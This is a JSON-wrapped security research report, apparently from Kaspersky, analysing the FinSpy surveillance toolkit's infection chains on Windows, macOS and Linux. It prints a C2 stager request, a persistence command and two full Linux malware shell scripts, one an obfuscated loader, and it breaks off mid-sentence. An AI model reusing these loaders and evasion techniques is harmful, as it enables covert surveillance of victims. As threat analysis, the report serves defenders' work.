{
    "id": "9026bf44-3684-4de5-a3ae-04804bcdaf85",
    "created_at": "2023-01-12T15:03:56.522588Z",
    "updated_at": "2025-03-27T02:16:25.561646Z",
    "deleted_at": null,
    "sha1_hash": "145ecb9579d977b7cc23047f87b16a22f8611061",
    "title": "2021-09-28 - FinSpy- unseen findings",
    "authors": "",
    "file_creation_date": "2022-05-28T02:05:13Z",
    "file_modification_date": "2022-05-28T02:05:13Z",
    "file_size": 942389,
    "plain_text": "# FinSpy: unseen findings\n\n**securelist.com/finspy-unseen-findings/104322/**\n\nAuthors\n\nGReAT\n\n[FinSpy, also known as FinFisher or Wingbird, is an infamous surveillance toolset. Kaspersky has](http://download.microsoft.com/download/E/B/0/EB0F50CC-989C-4B66-B7F6-68CD3DC90DE3/Microsoft_Security_Intelligence_Report_Volume_21_English.pdf)\nbeen tracking deployments of this spyware since 2011. Historically, its Windows implant was\n[distributed through a single-stage installer. This version was detected and researched several](https://www.microsoft.com/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/) [times](https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf)\nup to 2018. Since that year, we observed a decreasing detection rate of FinSpy for Windows. While\nthe nature of this anomaly remained unknown, we began detecting some suspicious installers of\nlegitimate applications, backdoored with a relatively small obfuscated downloader. We were unable to\ncluster those packages until the middle of 2019 when we found a host that served these installers\namong FinSpy Mobile implants for Android. Over the course of our investigation, we found out that\nthe backdoored installers are nothing more than first stage implants that are used to download and\ndeploy further payloads before the actual FinSpy Trojan.\n\nApart from the Trojanized installers, we also observed infections involving usage of a UEFI or MBR\nbootkit. While the MBR infection has been known since at least 2014, details on the UEFI bootkit are\npublicly revealed in this article for the first time.\n\nWe decided to share some of our unseen findings about the actual state of FinSpy implants. We will\ncover not only the version for Windows, but also the Linux and macOS versions, since they have a lot\nof internal structure and code similarities.\n\n\n-----\n\nThe full details of this research, as well as future updates on FinSpy, are available to customers of the\nAPT reporting service through our Threat Intelligence Portal.\n\nContact: [intelreports@kaspersky.com](http://10.10.0.46/mailto:intelreports@kaspersky.com)\n\n## UEFI infection\n\nDuring our research, we found a UEFI bootkit that was loading FinSpy. All machines infected with the\nUEFI bootkit had the Windows Boot Manager (bootmgfw.efi) replaced with a malicious one. When\nthe UEFI transfers execution to the malicious loader, it first locates the original Windows Boot\nManager. It is stored inside the efi\\microsoft\\boot\\en-us\\ directory, with the name consisting of\nhexadecimal characters. This directory contains two more files: the Winlogon Injector and the Trojan\nLoader. Both of them are encrypted with RC4. The decryption key is the EFI system partition GUID,\nwhich differs from one machine to another.\n\n**_Sample contents of the \\efi\\microsoft\\boot\\en-us\\ directory_**\n\nOnce the original bootloader is located, it is loaded into memory, patched and launched. The patched\nlauncher:\n\nPatches the function of the OS loader that transfers execution to the kernel\nThe patched function hooks the kernel’s PsCreateSystemThread function, which, when called\nfor the first time, creates an additional thread that decrypts the next loader stage and launches\nit.\n\nThe next stage:\n\nLocates the Trojan loader file on the EFI partition and decrypts it\nWaits until a user logs on and injects the Trojan loader into exe.\n\nThe Trojan loader:\n\nExtracts the Trojan from resources and drops it under the name dll\nDecrypts the Trojan with a XOR-based cipher and unpacks it with aPLib\nReflectively loads and launches the Trojan.\n\n## MBR infection\n\n\n-----\n\nOlder machines that do not support UEFI can be infected through the MBR. When the victim machine\nstarts up, the infected MBR copies the initial loader code from the last megabyte of the hard drive to\nthe highest available memory located before the EBDA .1 This code hooks the 13h and 15h BIOS\ninterrupts and then launches the original MBR. The 15h interrupt makes sure that the Windows loader\ndoes not overwrite the copied code. When this interrupt is called to get the size of the area before the\nEBDA, the hook will reduce the amount of available memory. As for the 13h interrupt hook (which\nmanages reading information from disk), it patches the OS loader when it is read from disk. Just as in\nthe case with the EFI infection, the hooked functions place their own hooks on further OS loading\nstages. The last hook in the chain creates a thread in the kernel that injects the next stage into\n**winlogon.exe.**\n\nIn case the infection is installed on a 32-bit machine, the process of injecting code into winlogon.exe\nis more complex than the one observed in the UEFI infection. It is as follows:\n\nA thread with trampoline shellcode is created inside exe.\nThis shellcode duplicates the exe process handle and transfers it to explorer.exe.\nThe shellcode injects another trampoline shellcode in Explorer.\nThe second shellcode makes exe inject the Trojan loader back into winlogon.exe.\n\nThis roundabout way of injecting code is intended to trick security solutions.\n\nThe injected Trojan loader is the same as the UEFI one.\n\n## User Mode Infection\n\n### Overview\n\nThis infection is by far the most complex. In short, the attack scenario is as follows:\n\nThe victim downloads a Trojanized application and executes it.\nDuring its normal course of operation the application connects to a C2 server, downloads and\nthen launches a non-persistent component called the Pre-Validator. The Pre-Validator ensures\nthat the victim machine is not used for malware analysis.\nThe Pre-Validator downloads Security Shellcodes from the C2 server and executes them. In\ntotal, it deploys more than 30 shellcodes. Each shellcode collects specific system information\n(e.g. the current process name) and uploads it back to the server.\nIn case a check fails, the C2 server terminates the infection process. Otherwise, it continues\nsending shellcodes.\nIf all security checks pass, the server provides a component that we call the Post-Validator. It is\na persistent implant likely used to ensure that the victim is the intended one. The Post-Validator\ncollects information that allows it to identify the victim machine (running processes, recently\nopened documents, screenshots) and sends it to a C2 server specified in its configuration.\nDepending on the information collected, the C2 server may command the Post-Validator to\ndeploy the full-fledged Trojan platform or remove the infection.\n\n\n-----\n\n-----\n\n**_Overview of the user mode infection_**\n\n### Trojanized applications\n\nThroughout our research, we identified numerous legitimate applications backdoored with FinSpy.\nExamples include software installers (e.g. TeamViewer, VLC Media Player, WinRAR) as well as\nportable applications.\n\nAll observed backdoored application samples have their original digital signature. It is invalid, which\nindicates that the application has been patched. While the entry point function of the application looks\nclear, inspection of the executable’s PE file sections does reveal anomalies: the backdoored\napplication has its last section (.rsrc on the screenshot below) expanded by 51 KB.\n\n**_Sections of the original (left) and backdoored (right) application_**\n\nApart from that, a part of code from the .text section (roughly 8 KB) is overwritten with heavily\nobfuscated code, with the original application code placed in the expanded last section.\n\nWhen the backdoored application launches, it runs as normal, i.e. the inserted obfuscated code does\nnot impact the application workflow. At some point the application executes a jump instruction that\nredirects execution to the obfuscated trampoline in the .text section. This instruction appears to be\nplaced randomly in the code. For example, a call to the CreateWindowExW function has been\nreplaced:\n\n**_The original (left) and patched (right) code of the backdoored application_**\n\nThis trampoline is protected with an obfuscator that we dubbed FinSpy Mutator. It launches a code\nthat:\n\n[Decrypts and launches a slightly modified Metasploit Reverse HTTPS stager. The decryption](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_http.rb)\nprocedure:\n\nIs obfuscated with FinSpy Mutator\nInvolves applying 10 operations (ADD, SUB, XOR, ROL, ROR) to every byte of the stager\nIs different in every backdoored installer.\nRestores the code in the .text section that was overwritten with the malicious code (recall that\nthe original code is saved in the resource section)\nResolves relocations in the restored code\nRestores the instruction that has been overwritten with a jump\n\n\n-----\n\nJumps to the restored instruction, thus resuming the execution of the original application.\n\nThe Metasploit stager connects to a configured C2 server using HTTPS for communication. In the\ncase of 5EDF9810355DE986EAD251B297856F38, the stager sends the following GET request to the\nC2 server:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n\nGET https://45[.]86[.]163[.]138/blog/ASVn6Wg5VbnZxiG2PSVbaSaG8PmI2ew2zFBQGEZbDUEmx9mE88dw0Zxmu-AeuheOJYJ1F6kTh6uA0UJDkfISp-k6bGNOuULoTSlr-AXwvWapnFLOe4QEpqY_pe3uoGC88y3JqiQifHlRRqcE9whGX_X14BIv35Q\n\nHTTP/1.1\n\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\n\nHost: 45[.]86[.]136[.]138\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\n\nThe C2 server replies with a component that we called the Pre-Validator in response to the GET\nrequest. The Metasploit stager launches it.\n\n### The Pre-Validator\n\nThe Pre-Validator is a shellcode obfuscated with FinSpy Mutator. On startup, it:\n\nHooks the NtTerminateProcess and ExitProcess functions to make sure the Pre-Validator\ncontinues working if the backdoored application is closed. The hooked functions close all the\napplication’s windows but do not terminate its process.\nMakes an initial POST request to the C2 server. Example of the request URL:\n**https://45[.]86[.]163[.]138/blog/index.asp?**\n**attachmentid=a46dee635db8017962741f99f1849471&d=5d7e89e6b4874d0df95141bd923556f8**\n(all parts of this URL vary between samples). All communications between the server are\nencrypted with RC4.\n\nThe reply to the initial POST request contains a shellcode that we called a Security Shellcode. On\nreceiving it, the Pre-Validator:\n\nDecrypts and executes the received Security Shellcode\nSends the shellcode execution results to the C2 server via a POST request.\nReceives the next Security Shellcode from the C2 server and repeats the steps above.\n\nThe nature of these shellcodes indicates that they are used to fingerprint the system and verify that it\nis not used for malware analysis. It is important to highlight that the shellcodes only collect the data,\nall the checks are performed server-side. In case a shellcode uploads suspicious execution results\n(e.g. the Pre-Validator is running on a virtual machine), the server provides a shellcode that\nterminates the Pre-Validator.\n\n\n-----\n\n[The received shellcodes are protected with either FinSpy Mutator, an obfuscator resembling OLLVM](https://github.com/obfuscator-llvm/obfuscator)\nor both these protectors. In total, we observed 33 Security Shellcodes provided by the server (listed in\nexecution order):\n\n\n**Shellcode**\n**#**\n\n\n**Description**\n\n\n1 [Attempts to detect a hypervisor with the CPUID (EAX = 1) instruction. If detected,](https://en.wikipedia.org/wiki/CPUID#EAX=1:_Processor_Info_and_Feature_Bits)\nreturns the hypervisor name (EAX = 0x40000000), otherwise returns zero bytes.\n\n2 Checks whether the current process needs to be impersonated (for example, if an\nunprivileged user runs the backdoored application as administrator).\n\n3 Returns the user’s profile folder (e.g. C:\\Users\\username)\n\n4 Returns the short form of the user’s profile folder (e.g. C:\\Users\\abcdef~1)\n\n5 Returns the type of the drive containing the backdoored application (e.g. removable\ndrive)\n\n6 Returns process names of the current process tree (i.e. the current process, the\nparent process, the grandparent process, etc.)\n\n7 Returns the path to the ‘Program Files’ folder.\n\n8 For the system drive, returns:\n\nOverall available space\nSpace available to current user (may be less than overall available space due to\nquotas)\nDisk capacity\n\n9 Returns the path to the user’s temporary folder.\n\n10 Returns the list of network adapter types, IP and MAC addresses assigned to them.\n\n11 Returns the list of running processes\n\n12 Returns ProcessDebugPort value returned by NtQueryInformationProcess for\ncurrent process.\n\n13 Returns ProcessDebugObjectHandle value returned by\n**NtQueryInformationProcess for current process.**\n\n14 Returns TotalNumberOfObjects and TotalNumberOfHandles values of objects\ncreated by NtCreateDebugObject.\n\n15 Returns the current user’s SID.\n\n16 Returns the list of images (EXE/DLL files) loaded into the current process.\n\n17 Returns OSVERSIONINFOEXW and SYSTEM_INFO structures.\n\n18 Returns information about the machine’s BIOS.\n\n19 Returns the list of object names in the \\GLOBAL?? directory.\n\n\n-----\n\n20 Returns information about the operating system.\n\n21 Returns the current user’s name, computer name, path to the current executable, its\nname and command line path.\n\n22 Returns the list of loaded drivers.\n\n23 Returns the list of PDB paths of loaded drivers\n\n24 Returns the first 16 bytes of the first exported Zw* function of ntdll.dll\n(ZwAcceptConnectPort)\n\n25 Verifies the signature of the parent process.\n\n26 Returns information about connected Plug and Play devices.\n\n27 Returns information about the computer system (from SELECT * FROM\nWin32_ComputerSystem WMI query)\n\n28 Returns the list of connected PCI devices.\n\n29 Returns names of shortcuts in the Desktop directory.\n\n30 Returns the list of top-level and child window class names not owned by the current or\nparent process.\n\n31 Returns the list of top-level and child window titles not owned by the current or parent\nprocess.\n\n32 Returns the current domain SID.\n\n33 Cleans API functions potentially hooked by security solutions: Nt* functions in ntdll.dll\nand all exported functions in kernel32.dll, kernelbase.dll and advapi32.dll.\n\nOnce all security checks are passed, the C2 server sends a shellcode that downloads and runs the\nPost-Validator Installer.\n\n### The Post-Validator Installer\n\nThis module is an obfuscated shellcode. It:\n\nCreates a subdirectory (name differs between samples) in the C:\\ProgramData directory\nDrops two files in the newly created subdirectory:\n\nThe Post-Validator Loader DLL\nA shellcode with the Post-Validator itself.\nThe file names are hardcoded in the dropper but are unique for each sample and appear to be\nrandomly generated.\n\nCreates a scheduled task that runs at system startup and launches the Post-Validator Loader\nvia regsvr32 (task action: %windir%\\syswow64\\regsvr32.exe /s “<path to the Loader\n**DLL>”)**\n\nAfter the Post-Validator is installed, the Pre-Validator shuts down.\n\n\n-----\n\n### The Post-Validator Loader\n\nThe Post-Validator Loader is a huge (3-9 MB) obfuscated DLL. The Task Scheduler launches it at\nsystem startup through regsvr32.exe. Its main function is several megabytes in size, but despite that,\nits purpose is simple: read and execute a shellcode that is stored in the same directory as the PostValidator Loader.\n\n**_Sample scheduled task properties_**\n\nThe launched shellcode decrypts the Post-Validator (it is stored in the same file with the shellcode)\nwith RC4 (key: domain SID) and reflectively loads it.\n\n### The Post-Validator\n\n[The Post-Validator is a DLL obfuscated with VMProtect. This module uses the same communication](https://vmpsoft.com/)\nprotocol that is used in the main Trojan component:\n\n[The TLV (type-length-value) format to exchange data with C2 servers](https://en.wikipedia.org/wiki/Type%E2%80%93length%E2%80%93value)\nTLV type constants that are found in the Trojan\nThe Trojan’s Cryptography Library to encrypt/decrypt exchanged data\n\nOn startup, the Post-Validator verifies that it is not launched inside a sandbox environment. It then\nstarts communication with C2 servers specified in its configuration, sending heartbeat messages with\n15-minute intervals. Each heartbeat includes brief information about the victim machine.\n\nThe heartbeat reply may contain different commands.\n\n\n**TLV ID** **Command purpose**\n**(inferred from the main**\n**Trojan)**\n\n0x8030A0 Retrieves the implant\nconfiguration.\n\n\n**Implementation of command in**\n**the Post-Validator**\n\n\n-----\n\n0x8070A0 Retrieve the list of files with\ndata prepared for\nexfiltration.\n\n0x8072A0 Upload a prepared file with\na specified name to the C2\nserver.\n\n\nSends back three strings in a TLV:\n**243a, 201a and 201b (‘virtual’ data**\nfile names)\n\nIf the prepared file name is:\n\n**201a, obtains the list of**\nprocesses and sends it to the\nC2 server.\n**201b, gets the list of recent**\nfiles and sends it to the C2\nserver.\n**243a, takes a screenshot and**\nuploads it to the C2 server.\n\nCommands are used to download\nand run the Trojan Installer.\n\n\n0x8054A0, 0x805BA0,\n0x8056A0, 0x805DA0,\n0x8057A0, 0x805EA0\n\n0x801530, 0x801630,\n0x801730, 0x8018A0\n\n\nCommands are used to\ndownload and install\nplugins.\n\n\nUninstall the Trojan. Uninstall the Pre-Validator.\n\n\n0x7502A0 Disconnect from the C2\nserver.\n\nWhen the Post-Validator receives the Trojan Installer (which is a DLL), it:\n\nReflectively loads and launches the Installer\nDepending on the configuration, either uninstalls itself (by deleting its directory and the\nscheduled task) or goes to sleep until system reboot.\n\nBased on the data collected by the Post-Validator, it is most likely that:\n\nThe Post-Validator is deployed to ensure that the infected victim is the intended one.\nThe C2 server operator manually analyzes data received from the victim and commands to\neither remove the Post-Validator or infect the machine with the Trojan.\n\nThe Post-Validator is another obstacle for researchers. Even if they manage to pass all the checks of\nthe Pre-Validator, the C2 server operator may refuse to infect a suspicious machine.\n\n### The Trojan Installer\n\nThe Installer creates the working directory (path: %localappdata%\\Microsoft\\<two concatenated\n**English words>) and sets it as being accessed, modified and created a year earlier. Afterwards, it**\ndrops the following files to it:\n\n**File name** **Description**\n\n\n**<4 random**\n**hexadecimal**\n**characters>.cab**\n\n\nThe setup configuration file, which is encrypted with RC4 (key: the\nname of the working directory).\n\n\n-----\n\n**Names differ between**\n**samples**\n\nThe Initial Loader.\n\n\nThe encrypted VFS file.\n\n\n**msvcr90.dll** The Trojan bundle, encrypted with XOR and compressed with aPLib.\n\n**msvcr120d.dll** 64-bit Trojan loader. The executable is prepended with 0x4000 random\nbytes and encrypted with RC4 (key: machine GUID)\n\n**msvcr140d.dll** 32-bit Trojan loader, also prepended with random bytes and encrypted\nwith RC4.\n\nThe timestamps of dropped files are set to one year earlier than the current date. Once the working\ndirectory is prepared, the Installer launches the Trojan.\n\n### The Initial Loader\n\nThe Initial Loader is a DLL that is launched on every startup by rundll32.exe (the Trojan adds it to the\n**HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run key, the value name is unique for**\neach sample). The size of the Initial Loader exceeds 5 MB. It is obfuscated with a protector\nresembling the open source OLLVM obfuscator. Despite its size, the only functionality of the Initial\nLoader is to decrypt and launch the 32-bit Trojan Loader.\n\n### The Trojan Loader\n\nThe 32-bit Trojan Loader, which is launched regardless of the victim machine architecture, checks if it\nis running on a 64-bit system. If so, it reads the 64-bit loader (msvcr120d.dll) from disk and runs it as\na shellcode.\n\nThe Trojan Loader (either the 32-bit or the 64-bit one):\n\nReads the Trojan bundle file (dll), decrypts it with XOR and unpacks with aPLib.\nInjects the Trojan DLL into exe by either calling CreateRemoteThread or using the\n**KernelCallbackTable** [technique.](https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/)\n\n## MacOS Infection\n\nThe macOS version of the malware is not as complicated as the Windows one. It is written in\nObjective-C. An obfuscator similar to OLLVM is used to protect FinSpy for Mac. Additionally,\nObjective-C selectors that may reveal information about method names contain junk.\n\nThe macOS version of FinSpy has the following components:\n\nThe Installer. Unlike the Windows version that features numerous installers, the macOS version\nhas only one installer type.\nThe Initial Loader.\nThe Trojan Loader.\nThe Trojan that consists of the Orchestrator, the Cryptography Library and plugins.\n\n\n-----\n\n### The Installer\n\nWhen the victim executes the malicious app, an executable located at the <malicious application\n**name>.app/Contents/MacOS/installer path is launched. On startup, it checks the environment for**\ndebuggers and virtual machines. It drops the following files to the machine:\n\n**Path** **Description**\n\n/Library/Frameworks/Storage.framework A directory with the Trojan inside\n\n/private/etc/logind The Trojan loader that runs as a launch agent. This file\nis executed on startup.\n\n/Library/LaunchAgents/logind.plist The configuration of the logind agent. The Trojan needs\nit in order to maintain persistence.\n\nAll copied files are timestomped (modification date is the timestamp of Finder.app). The Installer sets\ntheir owner to root:wheel. It additionally sets the SUID and SGID bits of the /private/etc/logind file.\n\nBy copying the logind.plist file to the /Library/LaunchAgents directory the Installer configures the\nTrojan to load at startup.\n\nThe Installer then launches the logind executable (Trojan Loader) with the launchctl utility.\n\n### The Initial Loader\n\nThe Initial Loader (/private/etc/logind) launches every time when the operating system boots up.\nOnce launched, The Initial Loader launches the Trojan Loader\n(/Library/Frameworks/Storage.framework/Contents/MacOS/logind).\n\n### The Trojan Loader\n\nThe Trojan Loader has a constructor function that is invoked before main. It sets hooks on functions\nthat load application bundles. These hooks allow the Trojan to load plugins while decrypting them on\nthe fly.\n\nOnce the hooks are placed, the Trojan Loader launches the Orchestrator\n(/Library/Frameworks/Storage.framework/Contents/Resources/dataPkg). The Orchestrator (as\nwell as plugins) are packed with aPLib and encrypted with AES. When the Orchestrator is unpacked,\nit is reflectively loaded.\n\n## Linux Infection\n\nThe Linux version of FinSpy is protected with an obfuscator similar to OLLVM. It has the same\ncomponents as in the macOS version (Initial Loader, Trojan Loader, Orchestrator and plugins).\n\n### The Installer\n\nInfection vectors used to deliver FinSpy for Linux are unknown. The leaked FinFisher support\nquestions database suggests physical access could be used to infect machines:\n\n\n-----\n\n**_A question related to Linux infection which was submitted to FinFisher support in 2013_**\n\nThe initial stage of the Installer is the following shell script:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n\n#!/bin/sh\n\nELF_MAGIC=7f\n\narch=`od -j4 -N1 -An -t u1 < /bin/sh | tr -d ' '`\n\ncase $arch in\n\n1)\n\nARCHIVE=`grep --text --line-number '^__x86xx__$' \"$0\" | cut -d ':' -f 1` ;;\n\n2)\n\nARCHIVE=`grep --text --line-number '^__x64xx__$' \"$0\" | cut -d ':' -f 1` ;;\n\n*)\n\nexit 0\n\n;;\n\nesac\n\nARCHIVE=$((ARCHIVE+1))\n\ntail -n +$ARCHIVE $0 > /tmp/udev2 && chmod +x /tmp/udev2\n\nif [ -n \"$SUDO_USER\" ]; then\n\nsu -c /tmp/udev2 $SUDO_USER\n\nelse\n\n/tmp/udev2\n\nfi\n\nif [ \"$?\" -eq 0 ];then\n\nrm -rf \"$0\"\n\nfi\n\nexit 0\n\n\n-----\n\nThis script determines the victim machine architecture. Depending on it, the script extracts either the\n32-bit or the 64-bit second stage installer to the /tmp/udev2 file and launches it. Both versions of the\ninstaller executable are appended to the Bash script. The 32-bit version is delimited from the script\nwith the __x86xx__ string, and the __x64xx__ string delimits the 64-bit version from the 32-bit one.\n\nThe launched executable first checks if it is running in a virtual machine with:\n\nThe CPUID assembly instruction\nThe lspci command\nThe dmesg command\n\nIn case a virtual machine is detected and the installed Trojan cannot be launched in a VM, the\ninstaller exits. The working directory is located at the ~/<directory #1>/<directory #2> path.\nDirectory #1 and #2 can take the following names that are selected randomly:\n\n**Directory #1 names** **Directory #2 names**\n\n\n.cache\n.dbus\n.fontconfig\n.gconf\n.gnome\n.gnome2\n.kde\n.local\n.qt\n.ssh\n\n\n.config\n.bin\n.sbin\n.etc\n.cfg\n.apps\n\n\nThe installer then drops the Trojan to the working directory. The name of the Trojan Loader file is one\nof the following:\n\ncpuset\nkthreadd\nksnapd\nudevd\ndbus-daemon\natd\ncrond\nhald\n\nThe plugin files have the <module ID>.so name, and the names of their configurations are <module\n**ID>C.dat.**\n\nAfter dropping the files, the Installer sets up persistence. On KDE, it copies a Bash script to either\n**~/.kde4/Autostart/udev2.sh or ~/.kde/Autostart/udev2.sh. On other desktop environments, it**\nappends the same script to the ~/.profile file.\n\n### The Initial Loader\n\nThe Initial Loader is the following shell script:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n\nif [ ! -n \"$CS_FONT\" ]; then\n\n# Load fonts by id\n\nCS_FONT_RID=\"<hexadecimal-encoded working directory path>\"\n\nCS_FONT_ID=\"<hexadecimal-encoded Trojan Loader filename>\"\n\nCS_FONT_COL=\"6364\"\n\nCS_FONT_COLF=`echo ${CS_FONT_COL} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print \"16i\n\"$0}'|dc 2>/dev/null|awk '{printf(\"%c\",$0)}'`\n\nCS_FONT_SID=`echo ${CS_FONT_RID} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print \"16i\n\"$0}'|dc 2>/dev/null|awk '{printf(\"%c\",$0)}'`\n\nCS_FONT_LOAD=`echo ${CS_FONT_ID} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print \"16i\n\"$0}'|dc 2>/dev/null|awk '{printf(\"%c\",$0)}'`\n\nif [ ! -n \"$CS_FONT_COLF\" ]; then\n\nCS_FONT_COLF=$(for i in `echo ${CS_FONT_COL} |sed 's/../& /g'`; do echo \"000000 $i\" |\nxxd -r; done)\n\nCS_FONT_SID=$(for i in `echo ${CS_FONT_RID} |sed 's/../& /g'`; do echo \"000000 $i\" |\nxxd -r; done)\n\nCS_FONT_LOAD=$(for i in `echo ${CS_FONT_ID} |sed 's/../& /g'`; do echo \"000000 $i\" |\nxxd -r; done)\n\nfi\n\n${CS_FONT_COLF} ${CS_FONT_SID} && ${CS_FONT_LOAD} > /dev/null 2>&1 &&\n${CS_FONT_COLF} - > /dev/null 2>&1\n\nunset CS_FONT_ID\n\nunset CS_FONT_COLF\n\nunset CS_FONT_SID\n\nunset CS_FONT_LOAD\n\nfi\n\n\nThis script decodes the directory path and the Trojan Loader from hexadecimal and executes the “cd\n**<working directory path> && ./<loader filename>** **> /dev/null 2>&1 && cd – > /dev/null 2>&1″**\ncommand, thus launching the Trojan Loader.\n\n### The Trojan Loader\n\nWhen launched, the Trojan Loader:\n\nChecks if it is being debugged with the ptrace function and exits if it is.\nReads the Orchestrator file from disk and unpacks it with aPLib.\n\n\n-----\n\nReflectively loads and launches the Orchestrator.\n\n## The Trojan\n\n### Overview of the Windows Trojan components\n\nThe Windows version of the Trojan consists of the following components:\n\nThe Hider, the first launched component. It starts the Orchestrator and conceals memory areas\nthat contain the Trojan components’ code and data.\nThe Orchestrator, a DLL which is responsible for managing installed plugins and preparing data\nto be sent to the C2 server\nPlugins, DLL modules that perform malicious activities on the victim machine\nThe virtual file system (VFS) which allows the Orchestrator and other plugins to seamlessly\ninteract with plugins and their configurations\nThe ProcessWorm module which intercepts system activity. Similar to a network worm which\ninfects machines in the local network, the ProcessWorm is injected into all running processes.\nOnce a process is infected, the ProcessWorm spreads to its children.\nThe Communicator module which sends data to the C2 server and receives replies\n\n### The Hider\n\nThe Hider is the first launched component of the Backdoor. It is a valid PE file protected with the\nFinSpy VM. On startup, the Hider loads a clean copy of ntdll.dll from disk, which is used when calling\nAPI functions from this library. After that, it decrypts the Orchestrator, which is stored in the Hider’s\nresource section. It is encrypted with a 256-byte RC4 key. which is unscrambled at runtime using\naddition, subtraction and XOR operations. The key may vary from one sample to another.\n\n**_A snippet of the RC4 key generation function_**\n\nAfter decrypting and unpacking the Orchestrator, the Hider reflectively loads it.\n\n\n-----\n\n**The hiding functionality**\n\nBefore transferring execution to the Orchestrator’s entry point, the Hider activates its concealing\nfunctionality. It works as follows:\n\nThe Hider encrypts the Orchestrator’s pages with a cipher based on XOR and ROL operations\nand assigns the PAGE_NOACCESS attribute to them\nWhen the Orchestrator accesses hidden pages, the operating system generates an\n**ACCESS_VIOLATION exception**\nThe Hider detects the generated exception through the hook of the\n**KiUserExceptionDispatcher function, which handles dispatching of all exceptions**\nThe hooked function decrypts the hidden page and assigns it the\n**PAGE_EXECUTE_READWRITE attribute, thus handling the exception**\nThe Hider conceals the unhidden pages again within 30 seconds.\n\nThe Hider also protects plugins loaded by the Orchestrator.\n\n## The Orchestrator\n\nThe Orchestrator is the core module of the Trojan that controls all plugins and manages C2 server\ncommunications.\n\nWhen the Orchestrator starts up, it:\n\n[Hooks its own IAT (import address table) to alter the behavior of WinAPI file manipulation](https://en.wikipedia.org/wiki/Portable_Executable#Import_table)\nfunctions. The Orchestrator needs these hooks to interact with the VFS.\nSets up persistence by creating an entry in the\n**HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key.**\nReads the Orchestrator configuration and loads installed plugins.\n\nAn interesting fact about the Orchestrator is that it erases its PE structures and code of initialization\nprocedures. This trick is designed to make it more difficult to detect this component in memory and\nconduct analysis of its dumps.\n\nOnce initialized, the Orchestrator launches its following components, which we will detail below:\n\nThe application watcher that looks for specific processes and notifies the C2 server when they\nare started or stopped\nThe ProcessWorm injector that injects the ProcessWorm into processes that are not infected\nwith this component\nThe recording manager thread that controls data to be exfiltrated to the C2 server\nThe C2 server communicator thread.\n\n### The application watcher\n\nThe application watcher regularly examines all the processes on the system, looking for applications\nspecified in the Orchestrator configuration. When it detects a starting first (or a stopping last) instance\nof a process from the list in the configuration, an appropriate event will be reported to the C2 server\n\n\n-----\n\nduring heartbeat time. It is notable that the application watcher acquires handles for all running\nprocesses on the system, which results in either winlogon.exe or explorer.exe obtaining numerous\nprocess handles.\n\n**_Process handles acquired by explorer.exe on a clean system (left) and on an infected system_**\n**_with the Orchestrator residing inside the explorer.exe process (right)_**\n\n### The ProcessWorm injector\n\nThe ProcessWorm injector thread ensures that the ProcessWorm is running in every process which\ncan be accessed by the Orchestrator. Just like the application watcher, the injector regularly obtains\nthe list of running processes. For every process, it verifies whether the ProcessWorm is running\ninside it and injects the ProcessWorm if needed.\n\n### The recording manager\n\nOver the course of their execution, plugins may save recording files in the working directory (e.g.\nkeylogs, screenshots or printed files). The recording manager is tasked with two duties:\n\nPeriodically checking whether there are recording files available to be sent to the C2 server\nPreparing recording files to be uploaded when their download is requested by the C2 server.\n\nEvery recording file stored in the working directory has the following name format:\n\n**<plugin prefix><recording type prefix><five-digit random number>.<extension>**\n\nThe plugin prefix, the extension and the recording type prefix depend on the ID of the plugin that\ncreated the recording. The Orchestrator has arrays which converts IDs to prefixes and extensions.\n\nPossible plugin prefixes: auth, avi, cert, crt, com, mem, sxs, msvc, dmem, mtx, net, nls, odbc, ole,\n_pnp, ssl, win, vm, vsc, ntos, user, run, cvs, cvg, con, ssy_\n\n\n-----\n\nRecording type prefixes: inf, sys, doc, mem, vmx, net, run, dat, dll.\n\nFilename extensions used: doc, vmx, net, xls, zip.\n\n### The C2 server communication thread\n\nThis thread is responsible for maintaining communication with the C2 server. In particular, it contacts\nthe C2 server, sends heartbeats messages and receives commands. The thread dispatches received\ncommands to plugins and sends their execution results back to the server.\n\nBelow is a list of the Orchestrator commands:\n\n**Command ID** **Description**\n\nCommands\nrelated to\nrecordings\n\n0x8072A0 Upload a recording file with a specified name to the C2 server.\n\n\n0x8076A0,\n0x807AA0\n\n\nDelete a recording with a given filename from the system.\n\n\n0x8078A0 Retrieve the list of all the recordings present on the victim machine.\n\n0x8070A0 Retrieve the list of recordings made by a plugin with the specified ID.\n\nCommands\nrelated to the\nconfiguration\n\n0x8030A0 Send the current configuration to the server.\n\n0x8032A0 Change the Orchestrator configuration.\n\nCommands\nrelated to\nplugins\n\n0x8009A0 Send a list of installed plugins to the server.\n\n\n0x8054A0,\n0x805BA0\n\n0x8056A0,\n0x805DA0\n\n0x8057A0,\n0x805EA0\n\n\nCommence the plugin installation process by creating a temporary file in the\nworking directory.\n\nAppend a plugin body chunk to the temporary plugin file created by the previous\ncommand.\n\nFinalize the plugin installation process. This command moves the contents of the\ntemporary file to the virtual file system and loads the new plugin.\n\n\n0x8059A0 Uninstall a plugin from the machine. This command unloads the specified plugin\nand removes it from the VFS.\n\nMiscellaneous\ncommands\n\n\n-----\n\n0x8018A0 Uninstall the backdoor. This command wipes all the files and registry keys created\nby the backdoor, as well as restores the MBR and the EFI Windows Boot Manager\n(provided they were infected) from backups.\n\n0x807DA0 Close the current C2 server connection.\n\n0x7502A0 Terminate all livestreams.\n\n## The Communicator module\n\nThe malware configuration 